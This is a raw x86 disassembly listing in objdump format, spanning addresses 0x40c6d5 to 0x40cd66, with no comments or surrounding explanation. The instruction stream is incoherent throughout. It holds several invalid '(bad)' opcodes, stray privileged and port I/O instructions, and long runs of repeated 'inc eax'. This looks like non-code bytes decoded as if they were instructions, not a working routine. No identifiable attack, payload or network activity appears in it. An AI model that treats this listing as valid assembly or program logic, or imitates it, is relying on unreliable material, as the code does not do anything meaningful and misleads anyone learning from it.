  40c6d5:	neg    BYTE PTR [ebx+0x34]
  40c6d8:	test   al,0x1e
  40c6da:	adc    eax,0x3bf96340
  40c6df:	sbb    al,0x12
  40c6e1:	xor    eax,0x40136040
  40c6e6:	inc    eax
  40c6e7:	add    BYTE PTR [eax+0x40],al
  40c6ea:	inc    eax
  40c6eb:	inc    eax
  40c6ec:	inc    eax
  40c6ed:	inc    eax
  40c6ee:	pop    es
  40c6ef:	adc    bh,BYTE PTR [eax-0x391b7ac]
  40c6f5:	(bad)  
  40c6f6:	fnstenv [ebx+eax*8+0x40405e41]
  40c6fd:	push   ebx
  40c6fe:	push   edx
  40c6ff:	mov    ah,0x42
  40c701:	dec    ebp
  40c702:	inc    eax
  40c703:	inc    eax
  40c704:	inc    eax
  40c705:	inc    eax
  40c706:	inc    eax
  40c707:	inc    eax
  40c708:	inc    eax
  40c709:	inc    eax
  40c70a:	inc    eax
  40c70b:	inc    eax
  40c70c:	and    DWORD PTR [esi],ecx
  40c70e:	xor    eax,0xf102c527
  40c713:	cld    
  40c714:	repz inc eax
  40c716:	inc    eax
  40c717:	mov    ch,0x60
  40c719:	arpl   WORD PTR [edx+edx*2+0x572f0f79],bp
  40c720:	fstp   DWORD PTR [edx+0x62]
  40c723:	push   0xffffffa8
  40c725:	inc    eax
  40c726:	push   0x4cd8657e
  40c72b:	mov    esp,0x40404040
  40c730:	inc    eax
  40c731:	inc    eax
  40c732:	int3   
  40c733:	jne    0x40c775
  40c735:	adc    BYTE PTR [ecx],cl
  40c737:	inc    eax
  40c738:	xor    eax,DWORD PTR [edi]
  40c73a:	adc    BYTE PTR ds:0x1040944b,dl
  40c740:	ins    DWORD PTR es:[edi],dx
  40c741:	fadd   DWORD PTR [eax+0x0]
  40c744:	rol    DWORD PTR [eax+0x40],0x40
  40c748:	inc    eax
  40c749:	add    BYTE PTR [eax-0x64],al
  40c74c:	retf   
  40c74d:	cmp    BYTE PTR ds:0x52304414,al
  40c753:	add    eax,0x40cd5867
  40c758:	inc    esi
  40c759:	mov    ebp,0x57fcdd5
  40c75e:	inc    esp
  40c75f:	add    esp,DWORD PTR [eax+0xc]
  40c762:	pusha  
  40c763:	adc    ah,BYTE PTR [ebx+ecx*8+0x60]
  40c767:	inc    eax
  40c768:	inc    eax
  40c769:	inc    esi
  40c76a:	int    0x40
  40c76c:	inc    eax
  40c76d:	inc    eax
  40c76e:	inc    eax
  40c76f:	inc    eax
  40c770:	inc    eax
  40c771:	inc    eax
  40c772:	inc    eax
  40c773:	inc    DWORD PTR [eax-0x54]
  40c776:	inc    edx
  40c777:	push   ecx
  40c778:	and    BYTE PTR ds:0x4365f34a,dl
  40c77e:	clc    
  40c77f:	xor    ch,BYTE PTR [edx+0x74c4040]
  40c785:	mov    dl,0x40
  40c787:	dec    esp
  40c788:	rol    DWORD PTR [eax+0x40],1
  40c78b:	inc    eax
  40c78c:	inc    eax
  40c78d:	inc    eax
  40c78e:	inc    eax
  40c78f:	inc    eax
  40c790:	inc    eax
  40c791:	inc    eax
  40c792:	inc    eax
  40c793:	adc    cl,BYTE PTR [ebp-0x6b]
  40c796:	fdiv   st,st(0)
  40c798:	adc    dl,BYTE PTR ds:0x6a60402d
  40c79e:	push   edx
  40c79f:	bound  ebp,QWORD PTR [ecx+0x7b]
  40c7a2:	arpl   WORD PTR [eax+eax*2],dx
  40c7a5:	jbe    0x40c774
  40c7a7:	aaa    
  40c7a8:	add    BYTE PTR [ebp-0x58],0x40
  40c7ac:	jle    0x40c7cf
  40c7ae:	pusha  
  40c7af:	test   al,0x40
  40c7b1:	inc    eax
  40c7b2:	inc    eax
  40c7b3:	inc    eax
  40c7b4:	inc    eax
  40c7b5:	inc    eax
  40c7b6:	inc    eax
  40c7b7:	inc    eax
  40c7b8:	add    BYTE PTR [edx+0x29],al
  40c7bb:	inc    esi
  40c7bc:	adc    eax,DWORD PTR [eax+0x42]
  40c7bf:	shl    DWORD PTR [ebp-0x2f],0x50
  40c7c3:	mov    ch,0x40
  40c7c5:	bound  esi,QWORD PTR [ecx]
  40c7c7:	gs inc eax
  40c7c9:	or     edx,DWORD PTR [edx-0x5a]
  40c7cc:	push   cs
  40c7cd:	inc    eax
  40c7ce:	add    al,BYTE PTR [edi]
  40c7d0:	add    DWORD PTR [eax+0x7b401562],esp
  40c7d6:	inc    eax
  40c7d7:	inc    eax
  40c7d8:	inc    eax
  40c7d9:	inc    eax
  40c7da:	inc    eax
  40c7db:	inc    eax
  40c7dc:	and    eax,0x13404040
  40c7e1:	fdiv   DWORD PTR [eax]
  40c7e3:	(bad)  
  40c7e4:	fadd   QWORD PTR [ecx+0x9]
  40c7e7:	inc    eax
  40c7e8:	inc    esi
  40c7e9:	push   edx
  40c7ea:	sub    BYTE PTR [eax-0x40],al
  40c7ed:	ret    0x3840
  40c7f0:	rol    BYTE PTR [edi],1
  40c7f2:	pushf  
  40c7f3:	xor    BYTE PTR [ebx],al
  40c7f5:	push   ss
  40c7f6:	pop    ds
  40c7f7:	inc    eax
  40c7f8:	aaa    
  40c7f9:	mov    ah,0x5
  40c7fb:	imul   eax,ecx,0x134040fa
  40c801:	inc    eax
  40c802:	inc    eax
  40c803:	inc    eax
  40c804:	inc    eax
  40c805:	inc    eax
  40c806:	inc    eax
  40c807:	inc    eax
  40c808:	inc    eax
  40c809:	inc    eax
  40c80a:	inc    eax
  40c80b:	mov    edi,0xa4909787
  40c810:	adc    al,0x30
  40c812:	fidivr DWORD PTR [edi+0xdb443c4]
  40c818:	inc    eax
  40c819:	inc    eax
  40c81a:	fstp   TBYTE PTR [esi+0x4162d140]
  40c820:	adc    BYTE PTR [ebx+0x2b],dh
  40c823:	inc    eax
  40c824:	inc    eax
  40c825:	inc    eax
  40c826:	inc    eax
  40c827:	inc    eax
  40c828:	inc    eax
  40c829:	rol    DWORD PTR [eax+0x40],0x2e
  40c82d:	inc    ebx
  40c82e:	push   esp
  40c82f:	or     eax,0xf3404041
  40c834:	aad    0x47
  40c836:	sub    bl,cl
  40c838:	rcr    BYTE PTR [ecx],0x7a
  40c83b:	push   edi
  40c83c:	inc    edx
  40c83d:	ss push 0x4a
  40c840:	or     DWORD PTR [eax+0x40],eax
  40c843:	mov    edi,0x36598460
  40c848:	stc    
  40c849:	adc    ch,BYTE PTR [eax]
  40c84b:	inc    ebp
  40c84c:	inc    eax
  40c84d:	inc    eax
  40c84e:	add    BYTE PTR [eax+0x40],al
  40c851:	inc    eax
  40c852:	inc    eax
  40c853:	inc    eax
  40c854:	inc    eax
  40c855:	sub    BYTE PTR [edx-0x27],ah
  40c858:	inc    ecx
  40c859:	mov    ds:0x65b74040,al
  40c85e:	pop    ss
  40c85f:	jo     0x40c82e
  40c861:	add    eax,0x7424003
  40c866:	(bad)  
  40c867:	stos   DWORD PTR es:[edi],eax
  40c868:	push   esp
  40c869:	inc    eax
  40c86a:	inc    eax
  40c86b:	inc    eax
  40c86c:	inc    eax
  40c86d:	inc    eax
  40c86e:	inc    eax
  40c86f:	inc    eax
  40c870:	inc    eax
  40c871:	inc    eax
  40c872:	inc    eax
  40c873:	inc    ecx
  40c874:	inc    eax
  40c875:	xor    al,0xf1
  40c877:	fsub   DWORD PTR [ecx]
  40c879:	xchg   edx,eax
  40c87a:	arpl   WORD PTR [ecx+0x5],ax
  40c87d:	inc    eax
  40c87e:	inc    ebp
  40c87f:	push   edx
  40c880:	arpl   WORD PTR [ecx],dx
  40c882:	dec    eax
  40c883:	rol    BYTE PTR [eax+0x24],0x95
  40c887:	int    0xff
  40c889:	out    dx,eax
  40c88a:	les    edx,FWORD PTR [edx]
  40c88c:	add    al,0x40
  40c88e:	ja     0x40c8bf
  40c890:	push   0x40f86763
  40c895:	sub    esp,esi
  40c897:	inc    eax
  40c898:	inc    eax
  40c899:	inc    eax
  40c89a:	inc    eax
  40c89b:	inc    eax
  40c89c:	inc    eax
  40c89d:	int3   
  40c89e:	jne    0x40c8e0
  40c8a0:	shl    DWORD PTR [edx+0x43],0x35
  40c8a4:	mov    al,ds:0x653f4040
  40c8a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8aa:	sub    BYTE PTR [eax+0x29374015],al
  40c8b0:	inc    eax
  40c8b1:	or     eax,0x4041c518
  40c8b6:	inc    eax
  40c8b7:	fadd   DWORD PTR [eax-0x33]
  40c8ba:	mov    ah,0x4c
  40c8bc:	inc    ecx
  40c8bd:	inc    eax
  40c8be:	inc    eax
  40c8bf:	push   edi
  40c8c0:	dec    eax
  40c8c1:	dec    eax
  40c8c2:	inc    eax
  40c8c3:	add    cl,al
  40c8c5:	inc    eax
  40c8c6:	inc    eax
  40c8c7:	inc    eax
  40c8c8:	inc    eax
  40c8c9:	add    BYTE PTR [eax+0x0],al
  40c8cc:	inc    ecx
  40c8cd:	ror    BYTE PTR [ebp*2+0x66350047],0x14
  40c8d5:	add    al,0x40
  40c8d7:	inc    eax
  40c8d8:	push   ecx
  40c8d9:	inc    ecx
  40c8da:	inc    edx
  40c8db:	arpl   ax,di
  40c8dd:	cli    
  40c8de:	or     eax,0x4cd44432
  40c8e3:	jle    0x40c948
  40c8e5:	sahf   
  40c8e6:	inc    eax
  40c8e7:	inc    eax
  40c8e8:	rcr    DWORD PTR [eax+eax*2+0x40404040],cl
  40c8ef:	inc    eax
  40c8f0:	inc    eax
  40c8f1:	inc    eax
  40c8f2:	inc    DWORD PTR [eax+0x3d]
  40c8f5:	mov    eax,0x25140d56
  40c8fa:	and    bh,al
  40c8fc:	ret    
  40c8fd:	bound  ebp,QWORD PTR [eax+0x77404041]
  40c903:	sbb    edx,DWORD PTR [ebx+0x57]
  40c906:	adc    BYTE PTR [ecx+0x8],al
  40c909:	and    al,0x34
  40c90b:	inc    eax
  40c90c:	inc    eax
  40c90d:	inc    eax
  40c90e:	inc    eax
  40c90f:	inc    eax
  40c910:	inc    eax
  40c911:	inc    eax
  40c912:	inc    eax
  40c913:	inc    eax
  40c914:	inc    eax
  40c915:	cmp    eax,0xc05459ab
  40c91a:	inc    eax
  40c91b:	inc    eax
  40c91c:	popf   
  40c91d:	bound  esi,QWORD PTR [ebp+ecx*8-0xa91f2bf]
  40c924:	inc    esi
  40c925:	int    0x5
  40c927:	xchg   edx,eax
  40c928:	cmp    ecx,0xa8542940
  40c92e:	leave  
  40c92f:	sbb    BYTE PTR [esp+ebx*4+0x4040bb0e],dh
  40c936:	inc    eax
  40c937:	inc    eax
  40c938:	inc    eax
  40c939:	inc    eax
  40c93a:	inc    eax
  40c93b:	inc    eax
  40c93c:	add    BYTE PTR [esi],dh
  40c93e:	cmp    BYTE PTR [ebp+ebp*1-0xabffa9e],0x3e
  40c946:	stos   DWORD PTR es:[edi],eax
  40c947:	add    eax,0xf411563
  40c94c:	jne    0x40c98f
  40c94e:	inc    eax
  40c94f:	inc    eax
  40c950:	inc    eax
  40c951:	inc    eax
  40c952:	inc    eax
  40c953:	inc    eax
  40c954:	and    eax,0x41404040
  40c959:	int    0x79
  40c95b:	inc    ebx
  40c95c:	inc    ecx
  40c95d:	inc    eax
  40c95e:	mov    ecx,0x9c484111
  40c963:	test   al,0xc0
  40c965:	or     DWORD PTR [ebp+0x7e],esi
  40c968:	shl    BYTE PTR ds:0x40051562,0xbf
  40c96f:	pop    ds
  40c970:	in     eax,0x41
  40c972:	sbb    ebx,ecx
  40c974:	clc    
  40c975:	adc    al,0xb9
  40c977:	push   ecx
  40c978:	inc    eax
  40c979:	inc    eax
  40c97a:	inc    eax
  40c97b:	inc    eax
  40c97c:	inc    eax
  40c97d:	inc    eax
  40c97e:	inc    eax
  40c97f:	inc    eax
  40c980:	inc    eax
  40c981:	inc    eax
  40c982:	js     0x40c9d0
  40c984:	dec    edi
  40c985:	adc    DWORD PTR [edx+0x6215f140],ebx
  40c98b:	inc    ebx
  40c98c:	pop    esp
  40c98d:	push   eax
  40c98e:	adc    eax,0x476c4003
  40c993:	inc    eax
  40c994:	xor    cl,BYTE PTR ds:0x71544041
  40c99a:	cmp    al,0xf
  40c99c:	push   esp
  40c99d:	inc    ebx
  40c99e:	inc    edx
  40c99f:	adc    eax,0x40404040
  40c9a4:	inc    eax
  40c9a5:	inc    eax
  40c9a6:	rol    DWORD PTR [eax+0x40],0x70
  40c9aa:	push   esp
  40c9ab:	lds    edx,FWORD PTR [eax]
  40c9ad:	hlt    
  40c9ae:	inc    esi
  40c9af:	les    eax,FWORD PTR [eax+0x40]
  40c9b2:	push   ss
  40c9b3:	retf   
  40c9b4:	addr16 add eax,0x501214ca
  40c9ba:	pop    ss
  40c9bb:	dec    edi
  40c9bc:	inc    eax
  40c9bd:	adc    eax,esi
  40c9bf:	cli    
  40c9c0:	inc    eax
  40c9c1:	cmp    eax,0xd6a83459
  40c9c6:	mov    esp,0xd5781498
  40c9cb:	add    BYTE PTR ds:0x4040eb62,0x0
  40c9d2:	inc    eax
  40c9d3:	inc    eax
  40c9d4:	inc    eax
  40c9d5:	inc    eax
  40c9d6:	inc    eax
  40c9d7:	inc    eax
  40c9d8:	or     eax,0xc525b640
  40c9dd:	xchg   BYTE PTR [edx-0x44ecbe1f],bl
  40c9e3:	mov    bh,0x43
  40c9e5:	inc    eax
  40c9e6:	inc    eax
  40c9e7:	inc    eax
  40c9e8:	inc    eax
  40c9e9:	inc    eax
  40c9ea:	inc    eax
  40c9eb:	inc    eax
  40c9ec:	inc    eax
  40c9ed:	inc    eax
  40c9ee:	inc    eax
  40c9ef:	adc    al,0xc4
  40c9f1:	push   ebx
  40c9f2:	inc    edx
  40c9f3:	inc    eax
  40c9f4:	je     0x40c9b1
  40c9f6:	hlt    
  40c9f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9f8:	dec    edi
  40c9f9:	mov    al,0xe4
  40c9fb:	push   cs
  40c9fc:	pop    ebx
  40c9fd:	inc    eax
  40c9fe:	inc    eax
  40c9ff:	inc    eax
  40ca00:	inc    eax
  40ca01:	inc    eax
  40ca02:	inc    eax
  40ca03:	int3   
  40ca04:	jne    0x40ca46
  40ca06:	pop    edi
  40ca07:	int3   
  40ca08:	add    eax,0x40f915af
  40ca0d:	adc    bl,0x22
  40ca10:	xchg   bl,dl
  40ca12:	inc    ebx
  40ca13:	xchg   esi,eax
  40ca14:	or     DWORD PTR [ecx+0x5f],esi
  40ca17:	cli    
  40ca18:	adc    eax,DWORD PTR [eax+0x0]
  40ca1b:	rol    DWORD PTR [eax+0x40],0x40
  40ca1f:	inc    eax
  40ca20:	add    BYTE PTR [eax+0x13],al
  40ca23:	mov    esp,0xdf424005
  40ca28:	test   al,0xa6
  40ca2a:	cwde   
  40ca2b:	adc    eax,0x5ff01fc9
  40ca30:	adc    al,BYTE PTR [eax+0x40]
  40ca33:	inc    eax
  40ca34:	inc    eax
  40ca35:	inc    eax
  40ca36:	inc    eax
  40ca37:	inc    eax
  40ca38:	inc    eax
  40ca39:	inc    DWORD PTR [eax+0x5]
  40ca3c:	xchg   ebx,ecx
  40ca3e:	es inc eax
  40ca40:	jp     0x40ca21
  40ca42:	inc    ecx
  40ca43:	xchg   ah,bl
  40ca45:	test   al,0x40
  40ca47:	adc    al,0x9f
  40ca49:	inc    ebx
  40ca4a:	inc    ecx
  40ca4b:	push   gs
  40ca4d:	inc    esp
  40ca4e:	inc    eax
  40ca4f:	inc    eax
  40ca50:	ss aaa 
  40ca52:	xor    BYTE PTR [ebp+0x1040dc12],ah
  40ca58:	inc    eax
  40ca59:	inc    eax
  40ca5a:	inc    eax
  40ca5b:	inc    eax
  40ca5c:	inc    eax
  40ca5d:	inc    eax
  40ca5e:	inc    eax
  40ca5f:	inc    eax
  40ca60:	inc    eax
  40ca61:	inc    eax
  40ca62:	arpl   WORD PTR [edi-0x33],bx
  40ca65:	add    eax,0x40195841
  40ca6a:	adc    bl,BYTE PTR [edi+0x63bc86d4]
  40ca70:	clc    
  40ca71:	sbb    DWORD PTR ds:0x3010d25f,edi
  40ca77:	push   cs
  40ca78:	xchg   esp,eax
  40ca79:	inc    eax
  40ca7a:	jl     0x40cabc
  40ca7c:	inc    eax
  40ca7d:	inc    eax
  40ca7e:	inc    eax
  40ca7f:	inc    eax
  40ca80:	inc    eax
  40ca81:	inc    eax
  40ca82:	inc    eax
  40ca83:	add    BYTE PTR [edi-0x549b5bee],bl
  40ca89:	adc    eax,0x625f7212
  40ca8e:	add    eax,0x40404244
  40ca93:	inc    eax
  40ca94:	inc    eax
  40ca95:	inc    eax
  40ca96:	inc    eax
  40ca97:	and    eax,0xc9404040
  40ca9c:	inc    eax
  40ca9d:	lahf   
  40ca9e:	lahf   
  40ca9f:	push   0x267d7086
  40caa4:	add    edi,DWORD PTR [ebx+0x5e]
  40caa7:	xor    al,0x40
  40caa9:	or     al,0x40
  40caab:	inc    eax
  40caac:	inc    eax
  40caad:	inc    eax
  40caae:	inc    eax
  40caaf:	inc    eax
  40cab0:	inc    eax
  40cab1:	inc    eax
  40cab2:	inc    eax
  40cab3:	inc    eax
  40cab4:	repz dec ebx
  40cab6:	inc    eax
  40cab7:	pop    ds
  40cab8:	jne    0x40cafa
  40caba:	mov    edi,0x5f7a4cd
  40cabf:	jb     0x40ca80
  40cac1:	dec    ebp
  40cac2:	add    eax,0x40f805b8
  40cac7:	pop    ds
  40cac8:	dec    ecx
  40cac9:	das    
  40caca:	xchg   BYTE PTR ds:0x40404040,al
  40cad0:	inc    eax
  40cad1:	inc    eax
  40cad2:	rol    DWORD PTR [eax+0x40],0xcb
  40cad6:	bound  eax,QWORD PTR [ebx+edi*2]
  40cad9:	mov    dh,0xc5
  40cadb:	adc    al,0x43
  40cadd:	mov    al,0xfa
  40cadf:	inc    eax
  40cae0:	cmp    DWORD PTR ds:0x544befc,eax
  40cae6:	sbb    BYTE PTR [eax+0x4b],al
  40cae9:	push   esp
  40caea:	aam    0x5
  40caec:	inc    ecx
  40caed:	leave  
  40caee:	inc    eax
  40caef:	inc    eax
  40caf0:	add    BYTE PTR [eax+0x40],al
  40caf3:	inc    eax
  40caf4:	inc    eax
  40caf5:	inc    eax
  40caf6:	inc    eax
  40caf7:	dec    ecx
  40caf8:	inc    eax
  40caf9:	rcl    DWORD PTR [ecx-0xe],1
  40cafc:	xchg   ah,dh
  40cafe:	dec    eax
  40caff:	bound  edx,QWORD PTR [ecx+ebp*1]
  40cb02:	inc    eax
  40cb03:	bound  eax,QWORD PTR ds:0x40c54432
  40cb09:	not    DWORD PTR [eax-0x3f574244]
  40cb0f:	dec    edi
  40cb10:	sbb    BYTE PTR [ebp+0x4005193a],dl
  40cb16:	inc    eax
  40cb17:	inc    eax
  40cb18:	inc    eax
  40cb19:	inc    eax
  40cb1a:	inc    eax
  40cb1b:	inc    eax
  40cb1c:	inc    eax
  40cb1d:	inc    eax
  40cb1e:	inc    eax
  40cb1f:	adc    BYTE PTR [eax],bl
  40cb21:	inc    edx
  40cb22:	inc    eax
  40cb23:	mov    ah,0x42
  40cb25:	pop    ecx
  40cb26:	xchg   ah,dh
  40cb28:	bound  ecx,QWORD PTR [eax+0x14]
  40cb2b:	aas    
  40cb2c:	shl    DWORD PTR [ebx+0x7],cl
  40cb2f:	add    eax,0x384041b1
  40cb34:	ret    
  40cb35:	mov    esp,0xc5e4cdbc
  40cb3a:	outs   dx,BYTE PTR ds:[esi]
  40cb3b:	add    eax,0x400595d3
  40cb40:	inc    eax
  40cb41:	inc    eax
  40cb42:	inc    eax
  40cb43:	inc    eax
  40cb44:	inc    eax
  40cb45:	int3   
  40cb46:	jne    0x40cb88
  40cb48:	mov    al,0x10
  40cb4a:	inc    esp
  40cb4b:	inc    eax
  40cb4c:	push   edi
  40cb4d:	inc    esi
  40cb4e:	stc    
  40cb4f:	xchg   bl,cl
  40cb51:	add    ah,BYTE PTR [ebx+0xe]
  40cb54:	dec    ebx
  40cb55:	inc    eax
  40cb56:	add    cl,al
  40cb58:	inc    eax
  40cb59:	inc    eax
  40cb5a:	inc    eax
  40cb5b:	inc    eax
  40cb5c:	add    BYTE PTR [eax-0x4f],al
  40cb5f:	bound  edx,QWORD PTR [edx+0x45]
  40cb62:	bound  esp,QWORD PTR [esi]
  40cb64:	inc    eax
  40cb65:	adc    edi,esi
  40cb67:	test   BYTE PTR [eax+0x43],0x43
  40cb6b:	test   eax,0x882e020f
  40cb70:	pop    ss
  40cb71:	in     al,dx
  40cb72:	inc    eax
  40cb73:	inc    eax
  40cb74:	inc    eax
  40cb75:	inc    eax
  40cb76:	inc    eax
  40cb77:	inc    eax
  40cb78:	inc    eax
  40cb79:	inc    eax
  40cb7a:	inc    DWORD PTR [eax-0x15]
  40cb7d:	inc    edi
  40cb7e:	inc    eax
  40cb7f:	adc    edx,DWORD PTR [edx+eiz*8]
  40cb82:	ins    BYTE PTR es:[edi],dx
  40cb83:	ror    BYTE PTR [ecx],0x1e
  40cb86:	or     DWORD PTR [ecx+0x2],eax
  40cb89:	sub    al,0x62
  40cb8b:	test   al,0x62
  40cb8d:	push   0x40547140
  40cb92:	inc    eax
  40cb93:	inc    eax
  40cb94:	inc    eax
  40cb95:	inc    eax
  40cb96:	inc    eax
  40cb97:	inc    eax
  40cb98:	inc    eax
  40cb99:	inc    eax
  40cb9a:	inc    eax
  40cb9b:	mov    esp,0x4b8c12a9
  40cba0:	adc    al,0x12
  40cba2:	jne    0x40cc0c
  40cba4:	mov    eax,0x40b00d4c
  40cba9:	adc    DWORD PTR [ebx+0x62],edx
  40cbac:	ficom  WORD PTR ds:0x4c037dcd
  40cbb2:	inc    eax
  40cbb3:	inc    eax
  40cbb4:	inc    eax
  40cbb5:	inc    eax
  40cbb6:	inc    eax
  40cbb7:	inc    eax
  40cbb8:	inc    eax
  40cbb9:	inc    eax
  40cbba:	add    BYTE PTR [edi-0x33],dl
  40cbbd:	(bad)  
  40cbbe:	inc    edx
  40cbbf:	xor    BYTE PTR [eax+0x486e1140],ch
  40cbc5:	arpl   WORD PTR [esi],bp
  40cbc7:	inc    ecx
  40cbc8:	adc    dl,BYTE PTR ds:0x40404049
  40cbce:	inc    eax
  40cbcf:	inc    eax
  40cbd0:	inc    eax
  40cbd1:	and    eax,0x35404040
  40cbd6:	push   ebp
  40cbd7:	push   esp
  40cbd8:	fadd   DWORD PTR [edi-0x44]
  40cbdb:	inc    eax
  40cbdc:	xor    eax,DWORD PTR [ecx-0x41]
  40cbdf:	pop    es
  40cbe0:	arpl   ax,si
  40cbe2:	adc    eax,0xbd113f12
  40cbe7:	xor    esp,eax
  40cbe9:	imul   eax,DWORD PTR [edx+0x40],0x68500e64
  40cbf0:	dec    edi
  40cbf1:	xchg   edx,eax
  40cbf2:	jp     0x40cc08
  40cbf4:	shl    DWORD PTR [ebx],1
  40cbf6:	lds    ecx,FWORD PTR [ebp+0x40]
  40cbf9:	inc    eax
  40cbfa:	inc    eax
  40cbfb:	inc    eax
  40cbfc:	inc    eax
  40cbfd:	inc    eax
  40cbfe:	inc    eax
  40cbff:	inc    eax
  40cc00:	inc    eax
  40cc01:	inc    eax
  40cc02:	out    dx,al
  40cc03:	add    eax,0x4e44409c
  40cc08:	xchg   DWORD PTR [eax],esi
  40cc0a:	test   BYTE PTR es:[eax+0x13],0x91
  40cc0f:	xchg   esp,eax
  40cc10:	mov    edi,0xc94f4069
  40cc15:	inc    eax
  40cc16:	xchg   edi,edi
  40cc18:	mov    edi,0xbcb40464
  40cc1d:	push   cs
  40cc1e:	xchg   ebp,eax
  40cc1f:	inc    eax
  40cc20:	inc    eax
  40cc21:	inc    eax
  40cc22:	inc    eax
  40cc23:	inc    eax
  40cc24:	inc    eax
  40cc25:	rol    DWORD PTR [eax+0x40],0x28
  40cc29:	mov    ebp,0xd156ac1
  40cc2e:	inc    eax
  40cc2f:	js     0x40cc93
  40cc31:	dec    esp
  40cc32:	fstp   st(4)
  40cc34:	inc    ebx
  40cc35:	retf   
  40cc36:	or     DWORD PTR [ebx-0x9],edx
  40cc39:	int    0x41
  40cc3b:	jb     0x40cc2c
  40cc3d:	dec    esp
  40cc3e:	inc    eax
  40cc3f:	or     DWORD PTR [esi-0x37],edx
  40cc42:	and    BYTE PTR [ecx-0x18],dh
  40cc45:	inc    ebx
  40cc46:	pop    ds
  40cc47:	adc    DWORD PTR [ebp+0x48],edx
  40cc4a:	inc    eax
  40cc4b:	inc    eax
  40cc4c:	add    BYTE PTR [eax+0x40],al
  40cc4f:	inc    eax
  40cc50:	inc    eax
  40cc51:	inc    eax
  40cc52:	inc    eax
  40cc53:	inc    ecx
  40cc54:	arpl   WORD PTR [edx+0x40],sp
  40cc57:	inc    eax
  40cc58:	pop    edi
  40cc59:	adc    eax,esp
  40cc5b:	in     al,dx
  40cc5c:	inc    ecx
  40cc5d:	jne    0x40cc6f
  40cc5f:	adc    al,0xb9
  40cc61:	cmc    
  40cc62:	or     BYTE PTR [edi+0x54],ah
  40cc65:	pushf  
  40cc66:	imul   eax,DWORD PTR [eax+0x40],0x40
  40cc6a:	inc    eax
  40cc6b:	inc    eax
  40cc6c:	inc    eax
  40cc6d:	inc    eax
  40cc6e:	inc    eax
  40cc6f:	inc    eax
  40cc70:	inc    eax
  40cc71:	inc    eax
  40cc72:	inc    eax
  40cc73:	pop    ecx
  40cc74:	push   ebx
  40cc75:	push   ss
  40cc76:	push   0x7d
  40cc78:	arpl   WORD PTR [eax],dx
  40cc7a:	xor    esi,DWORD PTR [ebx-0x6f1177bf]
  40cc80:	cld    
  40cc81:	inc    eax
  40cc82:	dec    ecx
  40cc83:	inc    ebp
  40cc84:	sub    al,0x6a
  40cc86:	inc    eax
  40cc87:	inc    eax
  40cc88:	inc    eax
  40cc89:	inc    eax
  40cc8a:	inc    eax
  40cc8b:	inc    eax
  40cc8c:	int3   
  40cc8d:	jne    0x40cccf
  40cc8f:	test   al,0xdf
  40cc91:	inc    edi
  40cc92:	sbb    DWORD PTR ds:0x7b2d48f2,edx
  40cc98:	push   esi
  40cc99:	and    al,0x40
  40cc9b:	mov    edi,0x40c10040
  40cca0:	inc    eax
  40cca1:	inc    eax
  40cca2:	inc    eax
  40cca3:	add    BYTE PTR [eax+0x1a],al
  40cca6:	lds    esi,FWORD PTR [eax]
  40cca8:	scas   al,BYTE PTR es:[edi]
  40cca9:	test   al,0x92
  40ccab:	adc    bh,BYTE PTR [ecx]
  40ccad:	dec    ebx
  40ccae:	leave  
  40ccaf:	bound  esp,QWORD PTR [edx+0x10]
  40ccb2:	jp     0x40ccf4
  40ccb4:	stc    
  40ccb5:	inc    eax
  40ccb6:	inc    eax
  40ccb7:	inc    eax
  40ccb8:	inc    eax
  40ccb9:	inc    eax
  40ccba:	inc    eax
  40ccbb:	inc    eax
  40ccbc:	inc    eax
  40ccbd:	inc    DWORD PTR [eax-0x6d]
  40ccc0:	sar    BYTE PTR [eax+0x3dd8c64],0x21
  40ccc7:	cmp    eax,0x42349303
  40cccc:	rol    BYTE PTR [eax-0x6],1
  40cccf:	pop    esi
  40ccd0:	push   ebx
  40ccd1:	inc    eax
  40ccd2:	inc    eax
  40ccd3:	inc    eax
  40ccd4:	inc    eax
  40ccd5:	inc    eax
  40ccd6:	inc    eax
  40ccd7:	inc    eax
  40ccd8:	inc    eax
  40ccd9:	inc    eax
  40ccda:	inc    eax
  40ccdb:	inc    ecx
  40ccdc:	cmp    BYTE PTR [ebp-0x35],0x5
  40cce0:	cmp    bh,dl
  40cce2:	inc    ecx
  40cce3:	arpl   bp,ax
  40cce5:	lock mov edi,0x2c4bd240
  40cceb:	dec    edi
  40ccec:	dec    esp
  40cced:	jbe    0x40ccae
  40ccef:	inc    eax
  40ccf0:	inc    eax
  40ccf1:	inc    eax
  40ccf2:	inc    eax
  40ccf3:	inc    eax
  40ccf4:	inc    eax
  40ccf5:	inc    eax
  40ccf6:	inc    eax
  40ccf7:	add    BYTE PTR [ebx+esi*4],al
  40ccfa:	icebp  
  40ccfb:	inc    esp
  40ccfc:	in     al,dx
  40ccfd:	inc    edx
  40ccfe:	adc    BYTE PTR [eax-0x2a9dacc0],ah
  40cd04:	mov    ch,0x7d
  40cd06:	bound  eax,QWORD PTR [ecx]
  40cd08:	inc    eax
  40cd09:	mov    bl,0x79
  40cd0b:	leave  
  40cd0c:	xchg   edx,eax
  40cd0d:	cld    
  40cd0e:	test   eax,0xf1414043
  40cd13:	pop    ebp
  40cd14:	dec    esi
  40cd15:	arpl   WORD PTR [eax+0x40404040],di
  40cd1b:	inc    eax
  40cd1c:	inc    eax
  40cd1d:	and    eax,0x3b404040
  40cd22:	adc    al,0xb4
  40cd24:	mov    cl,0xd3
  40cd26:	and    eax,0x4008c40e
  40cd2b:	xor    BYTE PTR [edi],ch
  40cd2d:	int    0x1c
  40cd2f:	test   al,0xa6
  40cd31:	bound  eax,QWORD PTR [eax+0x40]
  40cd34:	inc    eax
  40cd35:	inc    eax
  40cd36:	inc    eax
  40cd37:	inc    eax
  40cd38:	inc    eax
  40cd39:	inc    eax
  40cd3a:	inc    eax
  40cd3b:	inc    eax
  40cd3c:	adc    ebp,edx
  40cd3e:	in     eax,0xbf
  40cd40:	rcl    DWORD PTR [edx],0x6f
  40cd43:	jp     0x40cd85
  40cd45:	xor    ecx,esp
  40cd47:	mov    edi,0x3c50ac2d
  40cd4c:	or     DWORD PTR [ebp+0x1551bda7],ebx
  40cd52:	retf   0x4044
  40cd55:	push   edi
  40cd56:	lds    eax,FWORD PTR [eax-0x7c]
  40cd59:	retf   
  40cd5a:	cmp    DWORD PTR [eax],ebp
  40cd5c:	or     al,0xd3
  40cd5e:	sub    ecx,ebp
  40cd60:	inc    eax
  40cd61:	inc    eax
  40cd62:	inc    eax
  40cd63:	inc    eax
  40cd64:	inc    eax
  40cd65:	inc    eax
  40cd66:	rol    DWORD PTR [eax+0x40],0xa8
